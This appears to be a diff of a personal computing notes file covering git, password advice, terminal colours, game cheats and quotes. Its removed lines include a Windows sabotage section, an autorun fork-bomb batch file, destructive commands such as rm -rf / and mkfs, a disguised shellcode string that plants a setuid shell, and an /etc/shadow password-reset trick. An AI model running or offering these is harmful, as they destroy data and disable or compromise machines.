+The drives should be unlocked once Windows actually shuts down.
+
+IF YOU CANNOT BOOT INTO WINDOWS AND THE DRIVES ARE HIBERNATION-LOCKED...
 
 Using a Linux Mint Live ISO, open Terminal and type:
-	sudo ntfsfix /dev/sdXY
+#	sudo ntfsfix /dev/sdXY
 where XY is the partition. For example sdA2
-  ____ ___ _____ 
- / ___|_ _|_   _|
-| |  _ | |  | |  
-| |_| || |  | |  
- \____|___| |_|  
--------------------------------------------------------------------
-Clone an archive with
-	git clone <web address>
-To push files to a repo
-	cd <git repo folder>
-	git status
-	git add file1 file2 file3... filen
-	git commit -a
-	git push
 
--------------------------------------------------------------------
-Set up users on GIT
-	git config --global user.name "John Doe"
-	git config --global user.email johndoe@example.com
- ____                                     _     
-|  _ \ __ _ ___ _____      _____  _ __ __| |___ 
-| |_) / _` / __/ __\ \ /\ / / _ \| '__/ _` / __|
-|  __/ (_| \__ \__ \\ V  V / (_) | | | (_| \__ \
-|_|   \__,_|___/___/ \_/\_/ \___/|_|  \__,_|___/
--------------------------------------------------------------------
-To Reset a Lost Password on Ubuntu
-Boot from a live CD
-Mount the computer’s hard drive
-Open Terminal.
-If using Ubuntu Live CD, type
-	gksudo nautilus
-If using Linux Mint Live CD, type
-	gksudo nemo
-If using Linux Mint KDE Live CD, type
-	kdesudo dolphin
-Go to mounted drive, and find the /etc/ directory
-Scroll past all the directories until you find the shadow text file
-Create a backup of the shadow text file
-Edit the file
-Scroll down to the username in question and replace the encrypted password with:
-	U6aMy0wojraho
 
--------------------------------------------------------------------
-Rules for Making Passwords
-	A strong password has at least 16 characters
-	A strong password uses uppercase letters.
-	A strong password is NOT made up of only uppercase letters.
-	A strong password uses lowercase letters.
-	A strong password is NOT made up of only lowercase letters.
-	A strong password uses numbers.
-	A strong password is NOT made up of only numbers.
-	A strong password uses symbols, such as !@#$%^&*()<>?:”{}+_
-	A strong password is NOT made up of only symbols.
-	A strong password is NOT found on only one row of the keyboard.
-	A strong password is NOT a series of similar keypresses on the keyboard.
-	A strong password is NOT like your previous password.
-	A strong password is NOT your name, and does NOT use any part of your name.
-	A strong password is NOT your login ID, and does NOT use any part of your login ID
-	A strong password is NOT your friend’s name.
-	A strong password is NOT the password your friend uses.
-	A strong password is NOT a family member’s name.
-	A strong password is NOT the password a family member uses.
-	A strong password is NOT a dictionary word.
-	A strong password is NOT your bank account number.
-	A strong password is NOT your social security number
-	A strong password is NOT your zip code, and does NOT use any part of your mailing address (either past or present)
-	A strong password is NOT your military ID number.
-	A strong password is NOT a password that unlocks a bunch of stored passwords.
-	A strong password is NEVER used as a login ID somewhere else.
+#   _____              _    _                 __   ______           _____         _               ___  ___               _       
+#  /  ___|            | |  (_)               /  | |___  /          /  __ \       | |              |  \/  |              (_)      
+#  \ `--.   ___   ___ | |_  _   ___   _ __   `| |    / /   ______  | /  \/  ___  | |  ___   _ __  | .  . |  __ _   __ _  _   ___ 
+#   `--. \ / _ \ / __|| __|| | / _ \ | '_ \   | |   / /   |______| | |     / _ \ | | / _ \ | '__| | |\/| | / _` | / _` || | / __|
+#  /\__/ /|  __/| (__ | |_ | || (_) || | | | _| |_./ /             | \__/\| (_) || || (_) || |    | |  | || (_| || (_| || || (__ 
+#  \____/  \___| \___| \__||_| \___/ |_| |_| \___/\_/               \____/ \___/ |_| \___/ |_|    \_|  |_/ \__,_| \__, ||_| \___|
+#                                                                                                                  __/ |         
+#                                                                                                                 |___/          
 
-I highly recommend the following sites for telling if the password you are using is secure:
-www.passfault.com
-www.howsecureismypassword.net
 
-Here are some password sites I approve of:
-http://maord.com/ - I highly recommend this site for generating passwords as it can generate up to 2500 passwords at a time (viewable as a webpage, or downloadable in CSV format or plain text), and includes features like MD5 and SHA1 hash values for encryption.
-www.passwordcard.org/en - For those of you who feel the need to have your passwords in print, Password Card does just that. It prints multiple secure passwords on a wallet-sized card for you to print, laminate, and save. Each card comes with 37 very secure passwords (8 passwords, 29 characters in length horizontally and 29 passwords, 8 characters in length vertically).
-www.passwordchart.com/ - This is a unique way to make a password! Type in a passphrase, and it generates a wallet-size chart for you. Then using substitution you can then make other secure passwords from simple words and phrases. Don’t lose the card though, or password you have will be lost! Includes options to generate charts with numbers and symbols.
-
--------------------------------------------------------------------
-  ____      _                
- / ___|___ | | ___  _ __ ___ 
-| |   / _ \| |/ _ \| '__/ __|
-| |__| (_) | | (_) | |  \__ \
- \____\___/|_|\___/|_|  |___/
--------------------------------------------------------------------
-RGB to CMYK Conversion
+#   ______  _______  ______      __               ______  _______  ___ ___  __  __ 
+#  |   __ \|     __||   __ \    |  |_ .-----.    |      ||   |   ||   |   ||  |/  |
+#  |      <|    |  ||   __ <    |   _||  _  |    |   ---||       | \     / |     < 
+#  |___|__||_______||______/    |____||_____|    |______||__|_|__|  |___|  |__|\__|
+#                                                                                  
 	computedC = 1 - (r/255)
 	computedM = 1 - (g/255)
 	computedY = 1 - (b/255)
@@ -892,18 +1166,13 @@ Find the minimum
 	M = (computedM - minCMY) / (1 - minCMY)
 	Y = (computedY - minCMY) / (1 - minCMY)
 	K = minCMY
-	
--------------------------------------------------------------------
-Previewing LS_COLOR changes across a spectrum
 
-for c in {0..255} ; do
-    echo -e "\e[38;05;${c}m ${c} Bash Prompt Color Chart\e[0m" 
-done
 
-You can change the first two numbers and preview all the color combinations across 255 permutations.
-
--------------------------------------------------------------------
-Changing Directory Colors in Terminal
+#   ______  __                          __                    _____    _______          ______  _______  _____    _______  ______  _______ 
+#  |      ||  |--..---.-..-----..-----.|__|.-----..-----.    |     |_ |     __|        |      ||       ||     |_ |       ||   __ \|     __|
+#  |   ---||     ||  _  ||     ||  _  ||  ||     ||  _  |    |       ||__     |        |   ---||   -   ||       ||   -   ||      <|__     |
+#  |______||__|__||___._||__|__||___  ||__||__|__||___  |    |_______||_______| ______ |______||_______||_______||_______||___|__||_______|
+#                               |_____|           |_____|                      |______|                                                    
 When your running Linux and do a "ls -al --color" in your Bash shell,  on some systems the directory color is so dark you can barely make out the directory names? This is surprisingly a common problem. Here’s the solution:
 You can change both the intensity and the color, along with the background color on lots of things.
 
@@ -935,151 +1204,187 @@ Backgrounds
 	46	Cyan background			106	Turquoise background
 	47	Grey background
 
-THE SWEET SPOT!!! = 38;05;{1..255}
 
-The first number is how light or dark you want the color to be, followed by a semicolon, and then the actual number of the color. If you want a background color, put in another semicolon and follow it with a background color. For example, dark gray text on a red background looks like this:
-01;30;41
+The first number is how light or dark you want the color to be, followed by a semicolon, and then the actual number of the color. If you want a background color, put in another semicolon and follow it with a background color.
+For example, dark gray text on a red background looks like this: 01;30;41
+
 After you alter your .bashrc file, to put the changes in effect you will have to restart your shell.
 
 You can have color combinations with 2, 3, 4, or more color tags. Experiment.
-There are also numbers that produce color that are not included in the standard chart (for example, 38 which I marked as a sweet spot)
 
 Here's some colors I want to save:
 Black Text on Red Background = 38;05;0;41
 White Blinking Test on Red Background = 01;05;41
 
-My preferred LS_COLORS config is:
-LS_COLORS='di=07;01;90;93:ln=35;40:so=32;40:pi=33;40:ex=31;40:bd=34;46:cd=34;43:su=0;41:sg=0;46:tw=0;42:ow=0;43:*.mp3=38;05;201:*.flac=38;05;202:*.wav=38;05;208:*.midi=38;05;208:*.ogg=38;05;202:*.jpg=38;05;39:*.png=38;05;39:*.gif=38;05;40:*.bmp=38;05;40:*.pdf=38;05;191:*.epub=38;05;191:*.doc=38;05;190:*.txt=38;05;190:*.odt=38;05;183:*.odg=38;05;183:*.torrent=00;38;05;238:';
 
- ____                                                ____                                          _                    __        ___           _                   
-|  _ \  __ _ _ __   __ _  ___ _ __ ___  _   _ ___   / ___|___  _ __ ___  _ __ ___   __ _ _ __   __| |___    ___  _ __   \ \      / (_)_ __   __| | _____      _____ 
-| | | |/ _` | '_ \ / _` |/ _ \ '__/ _ \| | | / __| | |   / _ \| '_ ` _ \| '_ ` _ \ / _` | '_ \ / _` / __|  / _ \| '_ \   \ \ /\ / /| | '_ \ / _` |/ _ \ \ /\ / / __|
-| |_| | (_| | | | | (_| |  __/ | | (_) | |_| \__ \ | |__| (_) | | | | | | | | | | | (_| | | | | (_| \__ \ | (_) | | | |   \ V  V / | | | | | (_| | (_) \ V  V /\__ \
-|____/ \__,_|_| |_|\__, |\___|_|  \___/ \__,_|___/  \____\___/|_| |_| |_|_| |_| |_|\__,_|_| |_|\__,_|___/  \___/|_| |_|    \_/\_/  |_|_| |_|\__,_|\___/ \_/\_/ |___/
-                   |___/                                                                                                                                            
--------------------------------------------------------------------
-Create Havoc on Windows
-Just because I hate Windows, I had to include this section.
-Here are some interesting ways to send a computer to hell.
-	In the BIOS disable the processors L2 cache. Machine crawls
-	Windows+break-->advanced system settings --> hardware tab --> Device Manager, right click disable mouse (make sure you can get here with just your keyboard so you can undo this!)
-	ctrl+alt + Arrow key - on some graphics cards this rotates the screen. (usually with no method of undoing this unless you know this shortcut)
-	Make a floppy boot disc/usb Key/CD Rom, pop it in the floppy drive and ensure its set to first in the boot order in bios (bonus points for removing the hdd from boot list and creating all 3 boot discs with a different os on each so they fix one then get the next!)
-	Use a partitioning tool to shrink the hdd partition to a few mb more than is currently in use
-	Do the opposite and fill up available space with multiple copies of large files. Combined with a startup script to start the copies would keep the hard drive filled if they first attempted cleanup by deleting files.
-And a few irritations to garnish the pc with
-	If it had internet access - Open Internet Properties --> connections Tab -->Lan Settings, Check use a proxy server, set the address to 127.0.0.1 (prevents them googling for solutions :P)
-	Right click on desktop - View - uncheck show desktop icons (irritating but not tough to fix)
-	sticky tape on the bottom of the mouse can disrupt the laser stopping the mouse working (couple this with the major disabling of the mouse in device manager to add confusion).
-	In word Office button -->Word Options --> proofing --> AutoCorrect Options --> add a few entries for common words, subtlety is your friend, is --> was the --> teh etc (2k7 instructions but can be done via different route in most versions)
+#   ______  ______  __  ______  ______                  _______  __                _______                          __        _______                __   
+#  |__    ||  __  ||__||      ||    __|     ______     |_     _||  |--..-----.    |     __|.--.--.--..-----..-----.|  |_     |     __|.-----..-----.|  |_ 
+#  |__    ||  __  | __ |  --  ||__    |    |______|      |   |  |     ||  -__|    |__     ||  |  |  ||  -__||  -__||   _|    |__     ||  _  ||  _  ||   _|
+#  |______||______||  ||______||______|                  |___|  |__|__||_____|    |_______||________||_____||_____||____|    |_______||   __||_____||____|
+#                   |_|                                                                                                               |__|                
+There are also numbers that produce color that are not included in the standard chart (for example, 38 which I marked as a sweet spot)
 
--------------------------------------------------------------------
-Windows Fork Bomb
-Create a .bat file containing the following text and make it autorun by dropping the .bat in startup folder
+THE SWEET SPOT!!! = 38;05;{1..255}
 
-:s
-start %0
-goto s
+There are 256 colors possible in this spot, allowing you to colorize your Terminal to virtually any color you need!
+To see all these colors
 
-This will spawn huge numbers of processes untill the machine grinds to a halt.
+#	for c in {0..255}
+#	do
+#	echo -e "\e[38;05;${c}m ${c} Bash Prompt Color Chart\e[0m" 
+#	done
 
--------------------------------------------------------------------
-Screw Windows with One Careless Click
-Locate a shortcut to a text file on your desktop. Right click on the shortcut and select Open With. Select Notepad as the application. Do not pay any attention to the check box that says “Always use this type of file” that is checked off by default. This is important. Do not touch the checkbox.	Observe that all of your application files now have .lnk tacked onto the end of the name and no matter what application you try to run it just pops up Notepad and displays the binary content of the lnk file. What a mess! You can’t run anything.
+You can change the first two numbers and preview all the color combinations across 255 permutations.
 
-Solution
-If you actually did this. Then you really need to clean this up. This is going to take some research. Find out where the file associations are stored in the registry.  Find the entry for .lnk files. Remove the notepad association.
 
- ____                                                ____                                          _                     _     _                  
-|  _ \  __ _ _ __   __ _  ___ _ __ ___  _   _ ___   / ___|___  _ __ ___  _ __ ___   __ _ _ __   __| |___    ___  _ __   | |   (_)_ __  _   ___  __
-| | | |/ _` | '_ \ / _` |/ _ \ '__/ _ \| | | / __| | |   / _ \| '_ ` _ \| '_ ` _ \ / _` | '_ \ / _` / __|  / _ \| '_ \  | |   | | '_ \| | | \ \/ /
-| |_| | (_| | | | | (_| |  __/ | | (_) | |_| \__ \ | |__| (_) | | | | | | | | | | | (_| | | | | (_| \__ \ | (_) | | | | | |___| | | | | |_| |>  < 
-|____/ \__,_|_| |_|\__, |\___|_|  \___/ \__,_|___/  \____\___/|_| |_| |_|_| |_| |_|\__,_|_| |_|\__,_|___/  \___/|_| |_| |_____|_|_| |_|\__,_/_/\_\
-                   |___/                                                                                                                          
--------------------------------------------------------------------
-“rm -rf /” Deletes Everything
-The command “rm -rf /” deletes everything it possibly can, including all data on the hard drive, and all data on connected removable media devices.
+#   _____              _    _                 __   _____            _____  _                   _     _____             _            
+#  /  ___|            | |  (_)               /  | |  _  |          /  __ \| |                 | |   /  __ \           | |           
+#  \ `--.   ___   ___ | |_  _   ___   _ __   `| |  \ V /   ______  | /  \/| |__    ___   __ _ | |_  | /  \/  ___    __| |  ___  ___ 
+#   `--. \ / _ \ / __|| __|| | / _ \ | '_ \   | |  / _ \  |______| | |    | '_ \  / _ \ / _` || __| | |     / _ \  / _` | / _ \/ __|
+#  /\__/ /|  __/| (__ | |_ | || (_) || | | | _| |_| |_| |          | \__/\| | | ||  __/| (_| || |_  | \__/\| (_) || (_| ||  __/\__ \
+#  \____/  \___| \___| \__||_| \___/ |_| |_| \___/\_____/           \____/|_| |_| \___| \__,_| \__|  \____/ \___/  \__,_| \___||___/
+#                                                                                                                                   
+#                                                                                                                                   
 
--------------------------------------------------------------------
-Disguised rm -rf /
-char esp[] __attribute__ ((section(".text"))) /* e.s.p
-release */
-= "\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68"
-"\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99"
-"\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7"
-"\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56"
-"\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31"
-"\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69"
-"\x6e\x2f\x73\x68\x00\x2d\x63\x00"
-"cp -p /bin/sh /tmp/.beyond; chmod 4755
-/tmp/.beyond;";
 
-This is the hex version of rm -rf. It will delete everything just like the above command.
-The Lesson: Don’t run weird looking, obviously disguised code that you don’t understand.
+#   ______        __                                        _______         __                      ______ 
+#  |   __ \.----.|__|.-----..----..-----..-----..-----.    |   |   |.---.-.|  |--..-----..----.    |__    |
+#  |    __/|   _||  ||     ||  __||  -__||__ --||__ --|    |       ||  _  ||    < |  -__||   _|    |    __|
+#  |___|   |__|  |__||__|__||____||_____||_____||_____|    |__|_|__||___._||__|__||_____||__|      |______|
+#                                                                                                          
+Go to town.
+Press F12-R-N-Q.
+Go back home.
+Go to town.
 
--------------------------------------------------------------------
-“mkfs.ext4 /dev/sda1” - Formats the hard drive
-This command formats the drive and replaces your current drive (and all your files) with a new ext4 partition.
 
--------------------------------------------------------------------
-“mv ~ /dev/null” - Moves Your Home Directory to a Black Hole
-/dev/null is a special directory. Moving something to /dev/null is the same thing as destroying it. So this command would delete your entire home directory.
-
-  ____ _                _      ____          _           
- / ___| |__   ___  __ _| |_   / ___|___   __| | ___  ___ 
-| |   | '_ \ / _ \/ _` | __| | |   / _ \ / _` |/ _ \/ __|
-| |___| | | |  __/ (_| | |_  | |__| (_) | (_| |  __/\__ \
- \____|_| |_|\___|\__,_|\__|  \____\___/ \__,_|\___||___/
--------------------------------------------------------------------
-Princess Maker 2
-Go to town. Hold F12-R-N-Q. Go back home. Go to town.
-
--------------------------------------------------------------------
-ZAngband
+#   _______  _______                __                      __ 
+#  |__     ||   _   |.-----..-----.|  |--..---.-..-----..--|  |
+#  |     __||       ||     ||  _  ||  _  ||  _  ||     ||  _  |
+#  |_______||___|___||__|__||___  ||_____||___._||__|__||_____|
+#                           |_____|                            
 You can access Debugging mode, without that unsightly WIZARD mark on the screen, by enabling cheats in the menu. Press = then "i", and select f. This will allow you to cheat death, and enables all Debugging commands.
 
 === Debugging mode ===
-Debugging mode is a bit more useful. To enter debug mode for the first time, hold down the ctrl key and press 'a', and respond yes to the warning and question the game provides you with. Any command you type immediately after holding down the ctrl key and press 'a' will be processed as a debug command. 
+Debugging mode is a bit more useful. To enter debug mode for the first time, hold down the ctrl key and press 'a', and respond yes to the warning and question the game provides you with.
+Any command you type immediately after holding down the ctrl key and press 'a' will be processed as a debug command. 
 To enter a command count: type '0', enter the number desired, and press enter. When prompted for a command, hold down the ctrl key and type 'a', then immediately enter a debug command.
 
 === Wizard mode ===
-Wizard mode does nothing else except keep your character alive, provide verbose information on all damage you do to monsters, and explain why an object disappears. To enter wizard mode, hold down the ctrl key and press 'w'.
+Wizard mode does nothing else except keep your character alive, provide verbose information on all damage you do to monsters, and explain why an object disappears.
+To enter wizard mode, hold down the ctrl key and press 'w'.
 
--------------------------------------------------------------------
-Flare RPG Cheats
+
+#   _______  __                     
+#  |    ___||  |.---.-..----..-----.
+#  |    ___||  ||  _  ||   _||  -__|
+#  |___|    |__||___._||__|  |_____|
+#                                   
 Save files are in
         ~/.local/share/flare
 Game modules are found in
         /usr/share/games/flare/flare-game/mods
 
--------------------------------------------------------------------
-Crawl Tiles Cheats (may not be current)
+
+#   _____                                                 ______                         __      _______  __                             _______                      
+#  |     \ .--.--..-----..-----..-----..-----..-----.    |      |.----..---.-..--.--.--.|  |    |     __||  |_ .-----..-----..-----.    |     __|.-----..--.--..-----.
+#  |  --  ||  |  ||     ||  _  ||  -__||  _  ||     |    |   ---||   _||  _  ||  |  |  ||  |    |__     ||   _||  _  ||     ||  -__|    |__     ||  _  ||  |  ||  _  |
+#  |_____/ |_____||__|__||___  ||_____||_____||__|__|    |______||__|  |___._||________||__|    |_______||____||_____||__|__||_____|    |_______||_____||_____||   __|
+#                        |_____|                                                                                                                               |__|   
 Press & in game to access Wizard Mode
 Press ? to see possible cheats
 
-  ___              _        _     _         ___              _            
- / _ \ _   _  ___ | |_ __ _| |__ | | ___   / _ \ _   _  ___ | |_ ___  ___ 
-| | | | | | |/ _ \| __/ _` | '_ \| |/ _ \ | | | | | | |/ _ \| __/ _ \/ __|
-| |_| | |_| | (_) | || (_| | |_) | |  __/ | |_| | |_| | (_) | ||  __/\__ \
- \__\_\\__,_|\___/ \__\__,_|_.__/|_|\___|  \__\_\\__,_|\___/ \__\___||___/
--------------------------------------------------------------------
+
+
+#   _____              _    _                 __   _____            _____                _              
+#  /  ___|            | |  (_)               /  | |  _  |          |  _  |              | |             
+#  \ `--.   ___   ___ | |_  _   ___   _ __   `| | | |_| |  ______  | | | | _   _   ___  | |_   ___  ___ 
+#   `--. \ / _ \ / __|| __|| | / _ \ | '_ \   | | \____ | |______| | | | || | | | / _ \ | __| / _ \/ __|
+#  /\__/ /|  __/| (__ | |_ | || (_) || | | | _| |_.___/ /          \ \/' /| |_| || (_) || |_ |  __/\__ \
+#  \____/  \___| \___| \__||_| \___/ |_| |_| \___/\____/            \_/\_\ \__,_| \___/  \__| \___||___/
+#                                                                                                       
+#                                                                                                       
 Never test for an error condition you don't know how to handle.
-
--------------------------------------------------------------------
-“Maybe books won’t survive the transition to digital devices, any more than scrolls survived the transition to movable type… what the digital age portends is not the end of the paper container of the book, but rather the way paper organized our assumptions about writing altogether.”
-
--------------------------------------------------------------------
-My Prices
-Answers					$.50
-Long answers				$1.00
-Answers requiring thought		$2.00
-Correct answers				$5.00
-Dumb looks are still free.
-
--------------------------------------------------------------------
+#	-------------------------------------------------------------------
+Maybe books won’t survive the transition to digital devices, any more than scrolls survived the transition to movable type.
+What the digital age portends is not the end of the paper container of the book, but rather the way paper organized our assumptions about writing altogether.
+#	-------------------------------------------------------------------
 “Before you buy software, make sure it believes in the same things you do. Whether you realize it or not, software comes with a set of beliefs built in. Before you choose software, make sure it shares yours.”
+#	-------------------------------------------------------------------
+“I think computer viruses should count as life. I think it says something about human nature that the only form of life we have created so far is purely destructive. We’ve created life in our own image.”
+#	-------------------------------------------------------------------
+at the i/o window they stand and look,
+to ask for the answers they could get from a book.
+complex or moronic, they don't seem to care.
+they'll keep hounding you 'til you pull out your hair.
+"go ask consulting" you say with a smile,
+though your mind is on killing the scum all the while.
+"my printer ain't working, can you tell me what's wrong?"
+so you walk back and say "it can't work, it's not on."
+--  poem found in the 1986 logsheets, anonymous writer at U. Kansas
+#	-------------------------------------------------------------------
+Do not try to guess the root password, that is impossible. Instead, realise the truth... there is no root password. Then you will see that it is 'sudo' that grants you access and not the root password.
+#	-------------------------------------------------------------------
+Is it possible that software is not like anything else, that it is meant to be discarded:  that the whole point is to always see it as a soap bubble?
+#	-------------------------------------------------------------------
+A wise designer lets users do his work for him rather than attempt to figure out what they want.
+After designing a complex of buildings, an architect was supposed to design the walkways between the buildings.
+He did not assume he knew how users would really use the walkways between buildings.
+So he didn’t design the walkways, or even build them at the same time he built the buildings.
+Rather he had a field of grass planted between the buildings. It is rumored he even put up signs saying, “Please Walk On The Grass.”
+A few months after the buildings were completed, he came back and saw where the most worn paths were where people walked across the grass between the buildings. Then, he knew where to place the walkways.
+#	-------------------------------------------------------------------
+“We’re sorry, but your password must contain an uppercase letter, a lowercase letter, a number, a symbol, a haiku, a gang sign, a hieroglyph, a Greek God, and the blood of a virgin.”
+#	-------------------------------------------------------------------
+10 Immutable Laws of Security
+	If a bad guy can persuade you to run his program on your computer, it's not your computer anymore.
+	If a bad guy can alter the operating system on your computer, it's not your computer anymore.
+	If a bad guy has unrestricted physical access to your computer, it's not your computer anymore.
+	If you allow a bad guy to upload programs to your website, it’s not your website anymore.
+	Weak passwords trump strong security.
+	A computer is only as secure as the administrator is trustworthy.
+	Encrypted data is only as secure as the decryption key
+	An out-of-date virus scanner is only marginally better than no virus scanner at all.
+	Absolute anonymity isn’t practical, either in real life or on the Web.
+	Technology is not a panacea.
+#	-------------------------------------------------------------------
+10 Immutable Laws of Security Administration
+	Nobody believes anything bad can happen to them, until it does.
+	Security only works if the secure way also happens to be the easy way.
+	If you don’t keep up with security fixes, your network won’t be yours for very long.
+	It doesn’t do much to install security fixes on your computer that was never secured to be begin with.
+	Eternal vigilance is the price of security.
+	There really is someone out there trying to guess your passwords.
+	The most secure network is a well-administered one.
+	The difficulty of defending a network is directly proportional to it’s complexity.
+	Security isn’t about risk avoidance; it’s about risk management.
+	Technology is not a panacea.
+#	-------------------------------------------------------------------
+A logical fallacy is a flaw in reasoning. Logical fallacies are like tricks or illusions of thought, and they're often very sneakily used by politicians and the media to fool people. Don't be fooled!
+#	-------------------------------------------------------------------
+10 Commandments of Logic
+	Thou shall not misrepresent or exaggerate an argument in order to make it easier to attack. (strawman fallacy)
+	Thou shall not ask a question with a presumption built into it, so that it is impossible to answer without appearing guilty (loaded question fallacy)
+	Thou shall not attack an opponent's character or personal traits in an attempt to undermine their argument. (ad hominem fallacy)
+	Thou shall not claim that a compromise between two extremes must be the truth (middle ground fallacy)
+	Thou shall not avoid criticism with an appeal to hypocrisy, answering criticism with criticism (tu quoque fallacy)
 
+	Thou shalt not use small numbers to represent the whole. (Hasty generalization)
+	Thou shalt not argue thy position by assuming one of the premises is true. (Begging the question)
+	Thou shalt not claim that because something occurred before, it must be the cause. (Post Hoc/False Cause)
+	Thou shalt not reduce the argument down to two possibilities. (False dichotomy)
+	Thou shalt not argue that because of our ignorance, claim must be true or false. (Ad ignorantum)
+	Thou shalt not lay the burden of proof onto him that is questioning the claim. (Burden of proof reversal)
+	Thou shalt not assume “this” follows “that” when it has no logical connection. (Non sequitur)
+	Thou shalt not claim that because a premise is popular, it must be true. (Bandwagon fallacy)
+#	-------------------------------------------------------------------
+#	-------------------------------------------------------------------
+#	-------------------------------------------------------------------
+#	-------------------------------------------------------------------
+#	-------------------------------------------------------------------
+#	-------------------------------------------------------------------
 -------------------------------------------------------------------
+
 The Programmers Alphabet
 A is for APPLE who sent us our Macs,
 D is for DEC, and they sold us a Vax.
@@ -1113,8 +1418,14 @@ and X for the windowing system we choose.
 
 Y is for YACC, quite a specialist tool,
 Z for the snores from the programming pool.
-
--------------------------------------------------------------------
+#	-------------------------------------------------------------------
+My Prices
+Answers					$.50
+Long answers				$1.00
+Answers requiring thought		$2.00
+Correct answers				$5.00
+Dumb looks are still free.
+#	-------------------------------------------------------------------
 Job Review Catch Phrases
 
 skilled oral communicator
@@ -1150,70 +1461,6 @@ adapts to stress
 goal oriented
 		continually sets low goals for himself, and usually fails to meet them.
 
--------------------------------------------------------------------
-at the i/o window they stand and look,
-to ask for the answers they could get from a book.
-complex or moronic, they don't seem to care.
-they'll keep hounding you 'til you pull out your hair.
-"go ask consulting" you say with a smile,
-though your mind is on killing the scum all the while.
-"my printer ain't working, can you tell me what's wrong?"
-so you walk back and say "it can't work, it's not on."
---  poem found in the 1986 logsheets, anonymous writer at U. Kansas
-
--------------------------------------------------------------------
-Do not try to guess the root password, that is impossible. Instead, realise the truth... there is no root password. Then you will see that it is 'sudo' that grants you access and not the root password.
-
--------------------------------------------------------------------
-“I think computer viruses should count as life. I think it says something about human nature that the only form of life we have created so far is purely destructive. We’ve created life in our own image.”
-
--------------------------------------------------------------------
-Is it possible that software is not like anything else, that it is meant to be discarded:  that the whole point is to always see it as a soap bubble?
-
--------------------------------------------------------------------
-“A wise designer lets users do his work for him rather than attempt to figure out what they want. After designing a complex of buildings, an architect was supposed to design the walkways between the buildings. He did not assume he knew how users would really use the walkways between buildings. So he didn’t design the walkways, or even build them at the same time he built the buildings. Rather he had a field of grass planted between the buildings. It is rumored he even put up signs saying, “Please Walk On The Grass.” A few months after the buildings were completed, he came back and saw where the most worn paths were where people walked across the grass between the buildings. Then, he knew where to place the walkways.”
-
--------------------------------------------------------------------
-“We’re sorry, but your password must contain an uppercase letter, a lowercase letter, a number, a symbol, a haiku, a gang sign, a hieroglyph, a Greek God, and the blood of a virgin.”
-
--------------------------------------------------------------------
-10 Immutable Laws of Security
-	If a bad guy can persuade you to run his program on your computer, it's not your computer anymore.
-	If a bad guy can alter the operating system on your computer, it's not your computer anymore.
-	If a bad guy has unrestricted physical access to your computer, it's not your computer anymore.
-	If you allow a bad guy to upload programs to your website, it’s not your website anymore.
-	Weak passwords trump strong security.
-	A computer is only as secure as the administrator is trustworthy.
-	Encrypted data is only as secure as the decryption key
-	An out-of-date virus scanner is only marginally better than no virus scanner at all.
-	Absolute anonymity isn’t practical, either in real life or on the Web.
-	Technology is not a panacea.
-
--------------------------------------------------------------------
-10 Immutable Laws of Security Administration
-	Nobody believes anything bad can happen to them, until it does.
-	Security only works if the secure way also happens to be the easy way.
-	If you don’t keep up with security fixes, your network won’t be yours for very long.
-	It doesn’t do much to install security fixes on your computer that was never secured to be begin with.
-	Eternal vigilance is the price of security.
-	There really is someone out there trying to guess your passwords.
-	The most secure network is a well-administered one.
-	The difficulty of defending a network is directly proportional to it’s complexity.
-	Security isn’t about risk avoidance; it’s about risk management.
-	Technology is not a panacea.
-	
--------------------------------------------------------------------
-10 Commandments of Logic
-	Thou shall not attack a person’s character, but the argument. (ad hominem)
-	Thou shalt not misrepresent or exaggerate a person’s argument in order to make them easier to attack. (Straw man fallacy)
-	Thou shalt not use small numbers to represent the whole. (Hasty generalization)
-	Thou shalt not argue thy position by assuming one of the premises is true. (Begging the question)
-	Thou shalt not claim that because something occurred before, it must be the cause. (Post Hoc/False Cause)
-	Thou shalt not reduce the argument down to two possibilities. (False dichotomy)
-	Thou shalt not argue that because of our ignorance, claim must be true or false. (Ad ignorantum)
-	Thou shalt not lay the burden of proof onto him that is questioning the claim. (Burden of proof reversal)
-	Thou shalt not assume “this” follows “that” when it has no logical connection. (Non sequitur)
-	Thou shalt not claim that because a premise is popular, it must be true. (Bandwagon fallacy)
 
     _    ____ _____   ____            __                                   
    / \  |  _ \_   _| |  _ \ _ __ ___ / _| ___ _ __ ___ _ __   ___ ___  ___ 
